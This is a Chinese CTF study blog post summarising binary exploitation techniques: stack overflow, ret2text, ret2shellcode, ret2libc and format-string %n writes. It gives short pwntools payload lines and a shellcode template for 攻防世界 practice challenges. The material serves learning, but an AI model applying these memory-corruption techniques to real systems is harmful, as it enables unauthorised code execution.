@@ -1,0 +1,365 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>大总结 | Makabaka</title><meta name="keywords" content="PWN"><meta name="author" content="makabaka"><meta name="copyright" content="makabaka"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="0x01 nc直接连当题目中直接出现了**”&#x2F;bin&#x2F;sh”、cat flag**时运行后nc即可 例题：攻防世界 get_shell 0x02 变量的覆盖1.算出两变量在段中的差值:  ​     可以直接在payload中直接写算式【’a’*(0x6C-0x68)】  ​     也可以用计算器算出结果后再写入payload【’a’*4】   2.再加上想输入的值 例题：攻防世界 hello_">
+<meta property="og:type" content="article">
+<meta property="og:title" content="大总结">
+<meta property="og:url" content="http://makabaka-yyds.github.io/2021/02/03/%E5%A4%A7%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Makabaka">
+<meta property="og:description" content="0x01 nc直接连当题目中直接出现了**”&#x2F;bin&#x2F;sh”、cat flag**时运行后nc即可 例题：攻防世界 get_shell 0x02 变量的覆盖1.算出两变量在段中的差值:  ​     可以直接在payload中直接写算式【’a’*(0x6C-0x68)】  ​     也可以用计算器算出结果后再写入payload【’a’*4】   2.再加上想输入的值 例题：攻防世界 hello_">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2021-02-03T06:28:48.000Z">
+<meta property="article:modified_time" content="2021-02-03T15:51:57.849Z">
+<meta property="article:author" content="makabaka">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/images/m.png"><link rel="canonical" href="http://makabaka-yyds.github.io/2021/02/03/%E5%A4%A7%E6%80%BB%E7%BB%93/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-02-03 23:51:57'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/images/tuoxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a></div></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Makabaka</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">大总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-02-03T06:28:48.000Z" title="发表于 2021-02-03 14:28:48">2021-02-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-02-03T15:51:57.849Z" title="更新于 2021-02-03 23:51:57">2021-02-03</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1><span id="0x01-nc直接连">0x01 nc直接连</span></h1><p>当题目中直接出现了**”/bin/sh”<strong>、</strong>cat flag**时运行后nc即可</p>
+<p><strong><em>例题：攻防世界 get_shell</em></strong></p>
+<h1><span id="0x02-变量的覆盖">0x02 变量的覆盖</span></h1><p>1.算出两变量在段中的差值:</p>
+<ul>
+<li><p>​     可以直接在payload中直接写算式【’a’*(0x6C-0x68)】</p>
+</li>
+<li><p>​     也可以用计算器算出结果后再写入payload【’a’*4】</p>
+</li>
+</ul>
+<p>2.再加上想输入的值</p>
+<p><strong><em>例题：攻防世界 hello_pwn</em></strong></p>
+<p><img src="/images/zj5.png" alt="zj5"></p>
+<p><img src="/images/zj6.png" alt="zj6"></p>
+<p>可以看到unk_601068允许输入的长度是10，而unk_601068和dword_60106C在.bss段相差4（6c-68）</p>
+<p>于是可以想到在unk_601068中输入4个数覆盖掉dword_60106C再输入自己想要的值</p>
+<p>payload = ‘a’*4 + p64(1853186401)</p>
+<h1><span id="0x03-栈溢出">0x03 栈溢出</span></h1><p>栈溢出是指向栈中写入了超出限定长度的数据，溢出的数据会覆盖栈中其它数据，从而影响程序的运行。</p>
+<p><strong>前提：stack未开启</strong></p>
+<p>算出变量到ret的长度，再写入想输入的值即可</p>
+<p><strong><em>例题：攻防世界 level0</em></strong></p>
+<p><img src="/images/zj7.png" alt="zj7"></p>
+<p><img src="/images/zj8.png" alt="zj8"></p>
+<p><img src="/images/zj9.png" alt="zj9"></p>
+<p><img src="/images/zj10.png" alt="zj10"></p>
+<p>可以看出没有开启栈保护，200远大于80</p>
+<p>直接栈溢出即可</p>
+<p>payload = ‘a’*(0x80+0x08) + p64(0x040059A)</p>
+<h1><span id="0x04-gets溢出漏洞">0x04 gets()溢出漏洞</span></h1><p>例如 gets(s) , 不管 s  的空间是否够用，gets函数一直都会往s里输东西，这就存在溢出问题</p>
+<p>于是可以用gets()溢出来达到修改某个变量的值的效果</p>
+<p><strong><em>例题：攻防世界 when_did_you_born</em></strong></p>
+<p><img src="/images/zj11.png" alt="zj11"></p>
+<p>gets函数的漏洞，利用v4覆盖掉v5的地址后改为1926即可</p>
+<p><img src="/images/zj12.png" alt="zj12"></p>
+<h1><span id="0x05-rop">0x05 ROP</span></h1><p>一直把栈溢出的作用当成了ROP的作用，后来才发现栈溢出只是ROP里的一个环节</p>
+<p>栈溢出控制点一般是在ret处，ROP的核心思想就是<strong>利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程</strong></p>
+<h2><span id="0x001-ret2text">0x001 ret2text</span></h2><p>ret2text 又可以理解为是ret to text，顾名思义就是<strong>将应该返回EIP的地址改成text中的某个地址</strong></p>
+<p>上面0x03栈溢出提到的level0就是个很好的例子，就不赘述了</p>
+<p>讲讲攻防世界的level2：</p>
+<p><strong><em>例题：攻防世界level2</em></strong>（system内并没有写入“/bin/sh”地址）</p>
+<p><img src="/images/zj13.png" alt="zj13"></p>
+<p><img src="/images/zj14.png" alt="zj14"></p>
+<p>这应该是属于ret2text的一种变式，很明显的栈溢出</p>
+<p>按f12发现给出了system和”/bin/sh”，但是点开system会发现system内并没有写入“/bin/sh”</p>
+<p><img src="/images/zj24.png" alt="zj24"></p>
+<p>“/bin/sh”的地址被单独给出来了</p>
+<p><img src="/images/zj25.png" alt="zj25"></p>
+<p>所以要在payload中将“/bin/sh”写入system</p>
+<p>system()和“/bin/sh”的地址怎么找呢？</p>
+<p>一种是在IDA中直接找（之前太菜找不到，尤其是找system）</p>
+<p>一种是在payload中通过函数查找</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">前提：elf &#x3D; ELF（&#39;level2&#39;）</span><br><span class="line">sys_addr &#x3D; elf.symbols[&#39;system&#39;]</span><br><span class="line">sh_addr  &#x3D; elf.search(&#39;&#x2F;bin&#x2F;sh&#39;).next()</span><br></pre></td></tr></table></figure>
+<p>最后的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;a&#39;*(0x88+0x4) + p32(sys_addr) + &#39;aaaa&#39; + p32(sh_addr)# &#39;aaaa&#39;是system函数的返回地址</span><br></pre></td></tr></table></figure>
+<p><strong><em>例题：攻防世界cgpwn2</em></strong>（ 没有/bin/sh）</p>
+<p>可将/bin/sh写入未初始化变量                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         </p>
+<h2><span id="0x002-ret2shellcode">0x002 ret2shellcode</span></h2><p><strong>将返回地址（EIP）覆盖到我们插入shellcode的首地址</strong></p>
+<p><strong>前提：NX未开启</strong></p>
+<p>先讲讲shellcode的概念：shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。说白了就是一段能得到权限的独立代码</p>
+<p>利用pwntools中自带的shellcraft基本写法（应该可以当模板记）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">前缀：context(os&#x3D;&#39;linux&#39;,arch&#x3D;&#39;amd64&#39;)</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br></pre></td></tr></table></figure>
+<p><strong><em>例题：攻防世界string</em></strong></p>
+<p>详情见其他博客</p>
+<h2><span id="0x003-ret2libc">0x003 ret2libc</span></h2><p>当开启了NX时，数据所在的内存页会标记为不可执行，此时再执行shellcode就会抛出异常。既然注入新代码不可行，那么就复用程序中已有的代码。而libc.so几乎在每个程序执行时都会加载，就可以利用libc中的函数。（当然 .text 中本身就有可用函数更好 , .text走投无路才会想着用libc）</p>
+<p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
+<p>具体GOT、PLT知识见：<a target="_blank" rel="noopener" href="https://linyt.blog.csdn.net/article/details/51635768">https://linyt.blog.csdn.net/article/details/51635768</a></p>
+<p>整个看了个大概，但是有些地方还是有点懵</p>
+<p>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void print_banner()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;Welcome to World of PLT and GOT\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    print_banner();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>GCC编译（一段完整代码的运行）可分为预处理、编译、汇编、链接四个阶段</p>
+<p>当处在汇编阶段时，所有元素的地址都是虚拟的，链接操作后，所有元素的地址才会被修改（重定位）为实际地址</p>
+<p>printf函数位于glibc动态库中，编译阶段编译器并不知道printf函数是在suoyiglibc库中的（链接阶段是可以知道printf定义在哪的，只是如果定义在动态库就不知道具体的地址），于是链接器会生成一段额外的小代码片段来获取printf函数地址，并完成对它的调用。</p>
+<p>GOT表示存放函数地址的数据表，PLT表表示额外代码段表。</p>
+<p><img src="/images/zj39.png" alt="zj39"></p>
+<h3><span id="解题思路">解题思路</span></h3><p>附件一般会给出libc.so的文件</p>
+<p>暂时只发现了两种算法，但是原理都是一样的，当有其中一个函数的真实地址后，其他函数的真实地址可以根据偏移值算出</p>
+<p>①算出“参照函数“libc和elf的偏移值，以它为base，再找出所求函数的libc值，再加减base得出真实地址</p>
+<p>例如：攻防世界forgot 的exp</p>
+<p><img src="/images/zj40.png" alt="zj40"></p>
+<p>②算出所求函数与”参照函数“在libc中的偏移值，等到知道”参照函数“的真实地址后，再根据此偏移值算所求函数的真实地址</p>
+<p>例如：攻防世界leve3 的exp</p>
+<p><img src="/images/zj41.png" alt="zj41"></p>
+<p><strong><em>例题：攻防世界level3</em></strong></p>
+<p>详情见其他博客</p>
+<h1><span id="0x06-格式化字符串漏洞">0x06 格式化字符串漏洞</span></h1><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43394612/article/details/84900668">https://blog.csdn.net/qq_43394612/article/details/84900668</a></p>
+<p>（也不知道讲不讲的清。。。。）</p>
+<p>首先了解一个格式化字符串“%n”</p>
+<p>%n表示的是将<strong>已经打印出来的字符个数</strong>，赋值给一个变量</p>
+<p><img src="/images/zj26.png" alt="zj26"></p>
+<p>%n之前打印了5个a，所以n的值变成了5。</p>
+<h2><span id="漏洞成因和基本原理">漏洞成因和基本原理</span></h2><p>正常的printf：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  int n&#x3D;5;</span><br><span class="line">  printf(&quot;%d&quot;,n);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但有人偷懒会写成这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char a[]&#x3D;&quot;neuqcsa&quot;;</span><br><span class="line">  printf(a);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当然，这是可以输出的，输出就为neuqcsa</p>
+<p>但是当我们输入的是字符串就会出问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;bits&#x2F;stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char a[100];</span><br><span class="line">  scanf(&quot;%s&quot;,a);</span><br><span class="line">  printf(a);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>假如我们输入的字符串是“%x%x%x”</p>
+<p><img src="/images/zj27.png" alt="zj27"></p>
+<p>可以看到本意是想输出字符串“%x%x%x”,却输出了内存中的一段地址</p>
+<p>再看看printf函数的堆栈图：（参数从右向左入栈）</p>
+<p><img src="/images/zj28.png" alt="zj28"></p>
+<p><img src="/images/zj29.png" alt="zj29"></p>
+<p><strong>printf函数并不知道参数的个数，它只会通过指针去搜索格式化字符串，然后根据格式化字符串的类型输出相应参数的值，直到搜索完最后一个格式化字符串</strong></p>
+<p>所以尽管没有参数，也会将format string 后面的内存当做参数以16进制输出。这样就会造成内存泄露。</p>
+<h2><span id="任意内存的读取及任意内存写入">任意内存的读取及任意内存写入</span></h2><p>任意的内存的读取需要用到格式化字符串 <strong>%s</strong>，其对应的参量是一个指向<strong>字符串首地址</strong>的指针，作用是<strong>输出这个字符串</strong>。</p>
+<p><strong>局部变量是存储在栈中的</strong></p>
+<p>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char a[100];</span><br><span class="line">  scanf(&quot;%s&quot;,a);</span><br><span class="line">  printf(a);</span><br><span class="line">  system(&quot;pause&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以得到：</p>
+<p><img src="/images/zj30.png" alt="zj30"></p>
+<p>看下堆栈图：<br> 这是调用scanf函数前的堆栈图。</p>
+<p><img src="/images/zj32.png" alt="zj32"></p>
+<p>输入字符串后的堆栈图：</p>
+<p><img src="/images/zj31.png" alt="zj31"></p>
+<p>调用printf函数的过程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax，数组首地址</span><br><span class="line">push eax  </span><br><span class="line">call printf</span><br></pre></td></tr></table></figure>
+<p>该过程只是将数组的首地址入栈，此时堆栈图如下。</p>
+<p><img src="/images/zj33.png" alt="zj33"></p>
+<p>所以在格式化字符串里用很多的%x 就一定可以找到这个AAAA的位置。我们将这个位置记下来，实例中就是第七个%x的位置，即第7个参数。</p>
+<p>这里说下可以直接读取第七个参数的方法。（在linux下有用，win下没用）<br> %&lt; number&gt;$x 是直接读取第number个位置的参数，同样可以用在%n，%d等等。<br> 但是需要注意64位程序，前6个参数是存在寄存器中的，从第7个参数开始才会出现在栈中，所以栈中从格式化字符串开始的第一个，应该是%7 $n</p>
+<h3><span id="修改内存">修改内存</span></h3><p><img src="/images/zj34.png" alt="zj34"></p>
+<p>得到b的地址</p>
+<p><img src="/images/zj35.png" alt="zj35"></p>
+<p>这里是第九个参数。<br> 接着用shellcode编码将b的地址写入，并查看能否写入成功。</p>
+<p><img src="/images/zj36.png" alt="zj36"></p>
+<p>用%n修改其值。</p>
+<p><img src="/images/zj37.png" alt="zj37"></p>
+<p>因为%n之前打印了75个字符，所以这里将b的值从0修改为75</p>
+<p><strong>你也可以通过%&lt; number &gt;$n 来直接修改第九个参数来修改b的值</strong>。</p>
+<p><img src="/images/zj38.png" alt="zj38"></p>
+<p>在%n之前打印了4个字符，所以b的值直接被修改为4了</p>
+<p><strong><em>例题：攻防世界CGfsb</em></strong></p>
+<p><img src="/images/zj17.png" alt="zj17"></p>
+<p><img src="/images/zj18.png" alt="zj18"></p>
+<p>pwnme为8时就能拿到flag，问题是并没有能输入pwnme的地方</p>
+<p>但是pwnme的上方有一个printf（&amp;s）明显的格式化字符串漏洞，可以以此来改变pwnme的值</p>
+<p>看看偏移值：</p>
+<p><img src="/images/zj19.png" alt="zj19"></p>
+<p>可以看出偏移值是10</p>
+<p>上exp：</p>
+<p><img src="/images/zj20.png" alt="zj20"></p>
+<p>注意%10$n处要加引号</p>
+<h1><span id="0x07-strcpy漏洞">0x07 strcpy漏洞</span></h1><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/bjbz_cxy/article/details/80388908">https://blog.csdn.net/bjbz_cxy/article/details/80388908</a></p>
+<p>strcpy是标准C库函数，不会去检查越界问题，所以它可以直接将内存中的值修改</p>
+<h1><span id="0x08-整数溢出">0x08 整数溢出</span></h1><p>参考:<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/28563004">https://zhuanlan.zhihu.com/p/28563004</a></p>
+<p>整数分为有符号和无符号</p>
+<p>异常情况有三种：①溢出   ②回绕   ③截断</p>
+<h2><span id="溢出">溢出</span></h2><p>表现在有符号整数上，有符号整数有正值、负值和零，有向上溢出和向下溢出两种。假设用k个字节表示一个整型变量, 那么这个变量可以表示的有符号整数的范围是-2^(8k-1) ~ 2^(8k-1) –  1,那么两个正整数或者两个负整数相加就有可能超过这个整型变量所能表示的范围, 向上超出&gt;2^(8k-1) – 1我们称之为向上溢出,  向下超出&lt;-2^(8k-1), 我们称之为向下溢出. </p>
+<p>对于signed char,正整数最大值为127，负整数最小值为128。unsigned char所能表示的最大值为255。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">signed char x;</span><br><span class="line">x &#x3D; 125 + 5;</span><br></pre></td></tr></table></figure>
+<p>上面代码会输出：-126，因为130的二进制位为10000010，符号为1，表示负数。对于有符号整型，负数是用补码表示的，即绝对值取反后加一。根据之前方法逆向回去，先减一后再取反得01111110，即126.所以10000010表示的是-126。</p>
+<h2><span id="回绕">回绕</span></h2><p>溢出后的数会以2^(8*sizeof(type))作模运算</p>
+<p>例如一个unsigned char（1字符，8bits）溢出了，会把溢出的值与256求模</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">  unsigned char x;</span><br><span class="line">  x &#x3D; 128 + 130;</span><br><span class="line">  printf(&quot;%d\n&quot;,x);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>会输出2，因为258%256=2</p>
+<h2><span id="截断">截断</span></h2><p>将一个较大宽度的数存入较小宽度的操作数中时，高位会发生截断（一般只取后八位）</p>
+<p><strong><em>例题：攻防世界int_overflow</em></strong></p>
+<p>详情见<a href="https://makabaka-yyds.github.io/2021/01/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8Bint_overflow/">https://makabaka-yyds.github.io/2021/01/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8Bint_overflow/</a></p>
+<h1><span id="0x0-杂七杂八">0x0  杂七杂八</span></h1><h2><span id="0x001-地址查找函数">0x001 地址查找函数</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">前提：elf &#x3D; ELF（&#39;level2&#39;）</span><br><span class="line">sys_addr &#x3D; elf.symbols[&#39;system&#39;]#在elf这个文件中查找system函数的地址</span><br><span class="line">sh_addr  &#x3D; elf.search(&#39;&#x2F;bin&#x2F;sh&#39;).next()#在文件中查找写有字符串“&#x2F;bin&#x2F;sh”的地址</span><br></pre></td></tr></table></figure>
+<h2><span id="0x002-关于systembinsh">0x002 关于system(/bin/sh)</span></h2><p>system（）函数调用的是地址</p>
+<p>/bin/sh只是一个字符串，所以在 f12+shift 以及查找函数查出来的都是写有 “/bin/sh” 这个内容的地址</p>
+<h2><span id="0x003-关于rand和srand">0x003 关于rand和srand</span></h2><p>随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，实际上是一段数字的循环，这些数字取决于随机种子。在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。<br><strong><em>例题：攻防世界guess_num</em></strong></p>
+<p><img src="/images/zj21.png" alt="zj21"></p>
+<p><img src="/images/zj22.png" alt="zj22"></p>
+<p><img src="/images/zj23.png" alt="zj23"></p>
+<p>gets的输出漏洞，v6是一个随机数，后面有一个判断，如果v4能与v6相等，那么就能拿到flag，而正好我们可以通过gets输出漏洞控制seed[0]让它每次产生的随机数都能被我们预知</p>
+<h5><span id="关于ctype库与dll">关于ctype库与dll</span></h5><p>我们使用python标准库中自带的ctypes模块进行python和c的混合编程</p>
+<h5><span id="libc共享库">libc共享库</span></h5><p>可以使用ldd查找</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~&#x2F;Desktop&#x2F;black&#x2F;GFSJ&#x2F;guess_num$ ldd guess_num </span><br><span class="line">    linux-vdso.so.1 &#x3D;&gt;  (0x00007ffd3f5a0000)</span><br><span class="line">    libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007f1e6c0b0000)</span><br><span class="line">    &#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x00007f1e6c67d000)</span><br></pre></td></tr></table></figure>
+<p>也可以在脚本中通过elf文件查找</p>
